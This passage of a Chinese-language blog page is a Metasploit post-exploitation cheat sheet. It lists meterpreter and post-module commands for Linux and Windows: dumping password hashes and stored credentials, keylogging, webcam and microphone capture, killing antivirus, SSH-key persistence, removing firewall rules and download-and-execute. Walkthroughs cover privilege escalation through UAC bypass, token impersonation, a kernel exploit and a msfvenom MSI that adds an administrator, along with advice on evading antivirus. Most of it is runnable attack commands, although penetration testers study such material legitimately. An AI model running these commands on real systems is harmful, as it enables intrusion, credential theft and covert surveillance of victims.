class="line"></span><br><span class="line"><span class="comment"># 执行指定文件内容记录的多个POST模块，记录格式 module arg1=v1,arg2=v2</span></span><br><span class="line">run post/multi/manage/multi_post</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用目标机器上的 open 或者 xdg-open这样的命令（即默认打开）打开一个URI</span></span><br><span class="line">run post/multi/manage/open URI=</span><br><span class="line"></span><br><span class="line"><span class="comment"># 播放youtube视频</span></span><br><span class="line">run post/multi/manage/play_youtube VID=</span><br><span class="line"></span><br><span class="line"><span class="comment"># 记录音频信息，对于非windows平台，请使用java meterpreter</span></span><br><span class="line">run post/multi/manage/record_mic</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启或关闭屏幕记录</span></span><br><span class="line">run post/multi/manage/screensaver</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置桌面背景</span></span><br><span class="line">run post/multi/manage/<span class="built_in">set</span>_wallpaper</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用目标系统自带的脚本程序创建一个反向TCP shell</span></span><br><span class="line">run post/multi/manage/system_session</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传并执行</span></span><br><span class="line">run post/multi/manage/upload_<span class="built_in">exec</span> LPATH=shell RPATH=/tmp/shell ARGS=参数</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建zip压缩，linux上会使用zip，windows上会使用7zip</span></span><br><span class="line">run post/multi/manage/zip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过一系列端口创建TCP或UDP通道，可用于探测防火墙规则</span></span><br><span class="line">run post/multi/recon/multiport_egress_traffic</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试当前用户的sudo命令及配置，对于每个命令会测试权限要求</span></span><br><span class="line">run post/multi/recon/sudo_commands</span><br></pre></td></tr></table></figure>
<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="Gather-1"><a href="#Gather-1" class="headerlink" title="Gather"></a>Gather</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查是不是容器</span></span><br><span class="line">run post/linux/gather/checkcontainer</span><br><span class="line"><span class="comment"># 检查是不是虚拟机</span></span><br><span class="line">run post/linux/gather/checkvm</span><br><span class="line"><span class="comment"># 枚举可以使用的命令</span></span><br><span class="line">run post/linux/gather/enum_commands</span><br><span class="line"><span class="comment"># 收集配置文件</span></span><br><span class="line">run post/linux/gather/enum_configs</span><br><span class="line"><span class="comment"># 枚举NagiosXI凭证</span></span><br><span class="line">run post/linux/gather/enum_nagios_xi</span><br><span class="line"><span class="comment"># 收集网络，防火墙，DNS，SSH，网卡等信息</span></span><br><span class="line">run post/linux/gather/enum_network</span><br><span class="line"><span class="comment"># 收集防护软件的信息</span></span><br><span class="line">run post/linux/gather/enum_protections</span><br><span class="line"><span class="comment"># 收集无线网络凭证，需要root权限</span></span><br><span class="line">run post/linux/gather/enum_psk</span><br><span class="line"><span class="comment"># 收集系统信息，包括用户，安装软件，运行服务，定时脚本，磁盘信息，log文件，setuid/setgid，CPU漏洞</span></span><br><span class="line">run post/linux/gather/enum_system</span><br><span class="line"><span class="comment"># 收集history文件信息，包括.ash_history，.bash_history各种shell，mysql,psql,vim等</span></span><br><span class="line">run post/linux/gather/enum_users_<span class="built_in">history</span></span><br><span class="line"><span class="comment"># 收集xchat的配置文件，凭证等</span></span><br><span class="line">run post/linux/gather/enum_xchat</span><br><span class="line"><span class="comment"># 收集当前用户gnome-commander记录的明文密码</span></span><br><span class="line">run post/linux/gather/gnome_commander_creds</span><br><span class="line"><span class="comment"># 使用libgnome-keyring收集当前用户网络密码，需要root权限运行</span></span><br><span class="line">run post/linux/gather/gnome_keyring_dump</span><br><span class="line"><span class="comment"># 导出linux系统上所有的密码hash，需要root权限运行</span></span><br><span class="line">run post/linux/gather/hashdump</span><br><span class="line"><span class="comment"># 收集 /etc/fstab 中 mount.cifs/mount.smbfs 记录的凭证信息</span></span><br><span class="line">run post/linux/gather/mount_cifs_creds</span><br><span class="line"><span class="comment"># 收集openvpn进程的凭证信息</span></span><br><span class="line">run post/linux/gather/openvpn_credentials</span><br><span class="line"><span class="comment"># 收集phpmyadmin数据库凭证信息</span></span><br><span class="line">run post/linux/gather/phpmyadmin_credsteal</span><br><span class="line"><span class="comment"># 收集pptp vpn 客户端，服务端，密码信息</span></span><br><span class="line">run post/linux/gather/pptpd_chap_secrets</span><br><span class="line"><span class="comment"># 收集tor隐藏服务配置信息，根据查找到的torrc文件搜索，需要root权限运行</span></span><br><span class="line">run post/linux/gather/tor_hiddenservices</span><br></pre></td></tr></table></figure>
<h3 id="Manage-1"><a href="#Manage-1" class="headerlink" title="Manage"></a>Manage</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># DNS欺骗</span></span><br><span class="line">run post/linux/manage/dns_spoofing</span><br><span class="line"><span class="comment"># 运行一个 Pseudo-Shell</span></span><br><span class="line">run post/linux/manage/pseudo_shell</span><br><span class="line"><span class="comment"># 下载并运行某个程序</span></span><br><span class="line">run post/linux/manage/download_<span class="built_in">exec</span></span><br><span class="line"><span class="comment"># 添加一个ssh key到指定的用户（或者全部用户），用于权限维持</span></span><br><span class="line">run post/linux/manage/sshkey_persistence</span><br><span class="line"><span class="comment"># 移除所有iptables规则</span></span><br><span class="line">run post/linux/manage/iptables_removal</span><br></pre></td></tr></table></figure>
<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="命令列表"><a href="#命令列表" class="headerlink" title="命令列表"></a>命令列表</h3><p>很多 meterpreter 自带的脚本命令已经废弃，替换为 post 模块。</p>
<p><code>search type:post windows</code> 查看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line">run arp_scanner -r 192.168.99.1/24  <span class="comment"># 利用arp进行存活主机扫描</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否是虚拟机 请使用 post/windows/gather/checkvm</span></span><br><span class="line">run checkvm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取用户hash</span></span><br><span class="line">run credcollect -p &lt;opt&gt;  The SMB port used to associate credentials.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取域管理账户列表</span></span><br><span class="line">run domain_list_gen</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从最近文档的.lnk文件收集信息</span></span><br><span class="line">run dumplinks</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已废弃，请使用multi_meter_inject</span></span><br><span class="line">run duplicate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已废弃，请使用 post/windows/gather/enum_chrome</span></span><br><span class="line">run enum_chrome</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已废弃，请使用 post/windows/gather/enum_firefox</span></span><br><span class="line">run enum_firefox</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有登录用户， 请使用 post/windows/gather/enum_logged_on_users</span></span><br><span class="line">run enum_logged_on_users</span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举Powershell和WSH配置，请使用 post/windows/gather/enum_powershell_env</span></span><br><span class="line">run enum_powershell_env</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出putty配置，请使用 post/windows/gather/enum_putty_saved_sessions</span></span><br><span class="line">run enum_putty</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出共享目录信息，请使用 post/windows/gather/enum_shares</span></span><br><span class="line">run enum_shares</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出 VMware 虚拟机及相关软件</span></span><br><span class="line">run enum_vmware</span><br><span class="line"></span><br><span class="line"><span class="comment"># windows事件日志管理，查询</span></span><br><span class="line">run event_manager</span><br><span class="line"></span><br><span class="line"><span class="comment"># 收集config信息，请使用 post/windows/gather/enum_files</span></span><br><span class="line">run file_collector</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出windows已安装软件，请使用 post/windows/gather/enum_applications.</span></span><br><span class="line">run get_application_list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取环境变量 请使用 post/multi/gather/env</span></span><br><span class="line">run get_env</span><br><span class="line"></span><br><span class="line"><span class="comment"># 收集filezilla凭证，请使用 post/windows/gather/credentials/filezilla_server</span></span><br><span class="line">run get_filezilla_creds</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已废弃，请使用 post/multi/manage/autoroute</span></span><br><span class="line">run get_<span class="built_in">local</span>_subnets</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取已配置的服务用户名密码</span></span><br><span class="line">run get_pidgin_creds</span><br><span class="line"></span><br><span class="line"><span class="comment"># 收集snmp，请使用 post/windows/gather/enum_snmp</span></span><br><span class="line">run get_valid_community</span><br><span class="line"></span><br><span class="line"><span class="comment"># 管理fireall,av等，请使用 post/windows/manage/killav</span></span><br><span class="line">run getcountermeasure</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启RDP，请使用 post/windows/manage/enable_rdp</span></span><br><span class="line">run getgui</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启telnet</span></span><br><span class="line">run gettelnet -u &lt;username&gt; -p &lt;password&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 收集VNC凭证，请使用 post/windows/gather/credentials/vnc</span></span><br><span class="line">run getvncpw</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取SMB hash，请使用 post/windows/gather/smart_hashdump</span></span><br><span class="line">run hashdump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入hosts文件，请使用 post/windows/manage/inject_host</span></span><br><span class="line">run hostsedit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启键盘记录，请使用 post/windows/capture/keylog_recorder，需要system</span></span><br><span class="line">run keylogrecorder</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请使用 post/windows/manage/killav</span></span><br><span class="line">run killav</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置开机启动payload，请使用 exploit/windows/local/persistence</span></span><br><span class="line">run metsvc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将当前session转移到另一个进程，请使用  post/windows/manage/migrate</span></span><br><span class="line">run migrate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令并返回</span></span><br><span class="line">run multi_console_<span class="built_in">command</span> -c ls</span><br><span class="line"></span><br><span class="line"><span class="comment"># 植入reverse tcp meterpreter到一个指定进程</span></span><br><span class="line">run multi_meter_inject</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行文件中的多个命令，每条命令一行，也可以 -c "ls;pwd;" 执行多个</span></span><br><span class="line">run multicommand</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行包含多个meterpreter脚本指令或后渗透脚本的文件，每条命令一行，也可以 -c "enum_chrome;enum_firefox" 执行多个</span></span><br><span class="line">run multiscript</span><br><span class="line"></span><br><span class="line"><span class="comment"># dns，ping 枚举</span></span><br><span class="line">run netenum</span><br><span class="line"></span><br><span class="line"><span class="comment"># 捕获网卡网络数据包，请使用 post/windows/manage/rpcapd_start</span></span><br><span class="line">run packetrecorder</span><br><span class="line"></span><br><span class="line"><span class="comment"># 熊猫杀软2007提权漏洞</span></span><br><span class="line">run panda_2007_pavsrv51</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请使用 exploit/windows/local/persistence</span></span><br><span class="line">run persistence</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请使用 exploit/windows/local/service_permissions，尝试利用替换服务从现有administrator权限提升至system</span></span><br><span class="line">run pml_driver_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过powershell导出sam hash</span></span><br><span class="line">run powerdump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请使用 post/windows/gather/enum_prefetch，该模块从WinXP，Win2k3和Win7系统收集预取文件信息以及相关注册表项的当前值。从每个预取文件中，我们将收集上次执行的文件时间（转换为utc），文件路径哈希，运行计数，文件名和执行路径。</span></span><br><span class="line">run prefetchtool</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看进程内存 run process_memdump putty.exe，run process_memdump -p [pid]</span></span><br><span class="line">run process_memdump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请使用 post/windows/gather/wmic_command，执行wmic命令</span></span><br><span class="line">run remotewinenum</span><br><span class="line">run scheduleme</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请使用 exploit/windows/local/ms10_092_schelevator 用于提权</span></span><br><span class="line">run schelevator</span><br><span class="line">run schtasksabuse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 收集共享，注册表，密码hash</span></span><br><span class="line">run scraper</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请使用 post/windows/escalate/screen_unlock，通过注入代码到lsass.exe实现解锁，可能导致死机或重启</span></span><br><span class="line">run screen_unlock</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请使用 post/windows/gather/screen_spy，定时截取屏幕，以判断是否有人在使用</span></span><br><span class="line">run screenspy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请使用 post/windows/gather/enum_files，搜索任意文件</span></span><br><span class="line">run search_dwld</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务管理</span></span><br><span class="line">run service_manager</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请使用 exploits/windows/local/service_permissions，利用服务替换进行权限提升</span></span><br><span class="line">run service_permissions_escalate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 记录一定时长的音频</span></span><br><span class="line">run sound_recorder</span><br><span class="line">run srt_webdrive_priv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请使用 post/windows/manage/download_exec，下载文件，可以指定下载完后立即执行</span></span><br><span class="line">run uploadexec</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试触发一个久远的漏洞  VirtualBox DoS http://milw0rm.com/exploits/9323</span></span><br><span class="line">run virtualbox_sysenter_dos</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过 Mcafee VirusScan Enterprise v8.7.0i+，上传一个payload使其开机运行，需要administrator</span></span><br><span class="line">run virusscan_bypass</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 vnc 服务</span></span><br><span class="line">run vnc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请使用 post/windows/manage/webcam，检测摄像头设备，拍照</span></span><br><span class="line">run webcam</span><br><span class="line">run winbf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动化执行一些检测脚本</span></span><br><span class="line">run winenum</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请使用 post/windows/gather/wmic_command</span></span><br><span class="line">run wmic</span><br></pre></td></tr></table></figure>
<p>post：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/gather/env  <span class="comment"># 获取用户环境变量</span></span><br><span class="line">run post/windows/gather/enum_logged_on_users -c  <span class="comment"># 列出当前登录用户</span></span><br><span class="line">run post/linux/gather/checkvm  <span class="comment"># 是否虚拟机</span></span><br><span class="line">run post/windows/gather/checkvm  <span class="comment"># 是否虚拟机</span></span><br><span class="line">run post/windows/gather/forensics/enum_drives  <span class="comment"># 查看存储器信息</span></span><br><span class="line">run post/windows/gather/enum_applications  <span class="comment"># 获取安装软件信息</span></span><br><span class="line">run post/windows/gather/dumplinks   <span class="comment"># 获取最近访问过的文档、链接信息</span></span><br><span class="line">run post/windows/gather/enum_ie  <span class="comment"># 获取IE缓存</span></span><br><span class="line">run post/windows/gather/enum_firefox  <span class="comment"># 获取firefox缓存</span></span><br><span class="line">run post/windows/gather/enum_chrome   <span class="comment"># 获取Chrome缓存</span></span><br><span class="line">run post/multi/recon/<span class="built_in">local</span>_exploit_suggester  <span class="comment"># 获取本地提权漏洞</span></span><br><span class="line">run post/windows/gather/enum_patches  <span class="comment"># 获取补丁信息</span></span><br><span class="line">run post/windows/gather/enum_domain  <span class="comment"># 查找域控</span></span><br><span class="line">run post/windows/gather/enum_snmp  <span class="comment"># 获取snmp团体名称</span></span><br><span class="line">run post/windows/gather/credentials/vnc  <span class="comment"># 获取vnc密码</span></span><br><span class="line">run post/windows/wlan/wlan_profile  <span class="comment"># 用于读取目标主机WiFi密码</span></span><br><span class="line">run post/multi/gather/wlan_geolocate <span class="comment"># 基于wlan进行地理位置确认 文件位于/root/.msf4/loot</span></span><br><span class="line">run post/windows/manage/killav 关闭杀毒软件</span><br></pre></td></tr></table></figure>
<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p><code>use post/windows/escalate/</code></p>
<h4 id="getsystem"><a href="#getsystem" class="headerlink" title="getsystem"></a>getsystem</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br></pre></td></tr></table></figure>
<h4 id="根据补丁提权"><a href="#根据补丁提权" class="headerlink" title="根据补丁提权"></a>根据补丁提权</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_patches  <span class="comment">#查看补丁信息</span></span><br><span class="line">background</span><br><span class="line">search MS10-015</span><br><span class="line">use exploit/windows/<span class="built_in">local</span>/ms10_015_kitrap0d</span><br><span class="line"><span class="built_in">set</span> session 8</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<h4 id="绕过-UAC-提权"><a href="#绕过-UAC-提权" class="headerlink" title="绕过 UAC 提权"></a>绕过 UAC 提权</h4><p>使用 bypassuac 提权<br>msf 内置一些 bypassuac 脚本，原理不同，使用方法类似，执行后返回一个新的会话，再次执行 getsystem 即可提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_eventvwr</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_injection</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_injection_winsxs</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_silentcleanup</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_vbs</span><br><span class="line">使用命令getsystem提权失败，然后利用bypassuac来提权，这里利用exploit/windows/<span class="built_in">local</span>/bypassuac模块(32位、64位都有效)</span><br><span class="line"></span><br><span class="line">use exploit/windows/<span class="built_in">local</span>/bypassuac</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<h4 id="使用-RunAs-提权"><a href="#使用-RunAs-提权" class="headerlink" title="使用 RunAs 提权"></a>使用 RunAs 提权</h4><p>该方法利用<code>exploit/windows/local/ask</code>模块(32 位、64 位都有效)，创建一个可执行文件并在目标机上发起一个提升权限请求的程序，触发系统 UAC，提示用户是否要继续，如果用户选择“是”，则会返回一个高权限的 meterpreter shell。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/<span class="built_in">local</span>/ask</span><br><span class="line"><span class="built_in">set</span> filename update.exe  <span class="comment"># 设置反弹程序名称</span></span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">run</span><br><span class="line"><span class="comment"># 输入run命令以后会在目标机上弹出UAC，提示用户是否允许，选择是就会返回一个高权限的meterpreter shell。</span></span><br></pre></td></tr></table></figure>
<p>注意事项：<br>使用 RunAs 模块进行提权时，系统当前用户须在管理员组或者知道管理员的密码，用户账户控制程序 UAC 设置则没有要求。使用 RunAs 模块进行提权时，会创建一个可执行文件，为了避免给杀毒软件查杀，该可执行文件（需进行免杀处理）的创建要使用 EXE::Custom 选项。</p>
<h4 id="假冒令牌提权"><a href="#假冒令牌提权" class="headerlink" title="假冒令牌提权"></a>假冒令牌提权</h4><p>令牌是系统临时密钥，它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源。这些令牌将持续存在于系统中，除非系统重新启动。一般有两种类型的令牌，一种是 Delegation Tokens，也就是授权令牌，它支持交互式登录（例如远程桌面登陆登录）。还有一种是 Impersonation Tokens，也就是模拟令牌，它是非交互的会话（例如访问文件共享）。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use incognito    <span class="comment"># 加载窃取令牌模块</span></span><br><span class="line">list_tokens -u    <span class="comment"># 查看可用的用户令牌</span></span><br><span class="line">list_tokens -g    <span class="comment"># 查看可用的用户组令牌</span></span><br><span class="line">impersonate_token <span class="string">'NT AUTHORITY\SYSTEM'</span>  <span class="comment"># 假冒SYSTEM token</span></span><br><span class="line">rev2self   <span class="comment">#返回原始token</span></span><br></pre></td></tr></table></figure>
<h4 id="利用-AlwaysInstallElevated-提权"><a href="#利用-AlwaysInstallElevated-提权" class="headerlink" title="利用 AlwaysInstallElevated 提权"></a>利用 AlwaysInstallElevated 提权</h4><p>AlwaysInstallElevated 是一个策略设置。微软允许非授权用户以 SYSTEM 权限运行安装文件(MSI)，如果用户启用此策略设置，那么黑客利用恶意的 MSI 文件就可以进行管理员权限的提升。</p>
<p>查看 AlwaysInstallElevated 是否被定义</p>
<p>不过利用此方法有个前提条件，需要有两个注册表的键值为 1，我们可以在 cmdshell 下查看 AlwaysInstallElevated 是否被定义</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
<p>如果需要开启可以选择以下方法：</p>
<ol>
<li>打开组策略编辑器（运行框输入 gpedit.msc）</li>
<li>组策略-&gt;计算机配置-&gt;管理模版-&gt;Windows 组件-&gt;Windows Installer-&gt;永远以高特权进行安装：选择启用</li>
<li>组策略-&gt;用户配置-&gt;管理模版-&gt;Windows 组件-&gt;Windows Installer-&gt;永远以高特权进行安装：选择启用</li>
</ol>
<h4 id="生成-MSI-安装文件"><a href="#生成-MSI-安装文件" class="headerlink" title="生成 MSI 安装文件"></a>生成 MSI 安装文件</h4><p>利用 msfvenom 命令生成一个在目标机上增加管理员用户的 MSI 安装文件，这里密码要设置为强密码，否则会报错。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/adduser USER=msi PASS=Abc123@@ <span class="_">-f</span> msi -o msi.msi</span><br><span class="line">上传并执行MSI文件</span><br><span class="line">upload msi.msi c:\\Users\\<span class="built_in">test</span> <span class="comment"># 部分目录由于权限原因可能上传失败</span></span><br><span class="line">msiexec /quiet /qn /i msi.msi <span class="comment"># /quiet=安装过程中禁止向用户发送消息 /qn=不使用图形界面 /i=安装程序</span></span><br><span class="line">net localgroup administrators</span><br><span class="line"><span class="comment"># 执行成功后查看管理员组发现用户已经添加成功</span></span><br></pre></td></tr></table></figure>
<p>注意：<br>由于是 msf 生成的 msi 文件，所以默认会被杀毒软件拦截，需要做好免杀</p>
<h3 id="窃取-hash"><a href="#窃取-hash" class="headerlink" title="窃取 hash"></a>窃取 hash</h3><h4 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
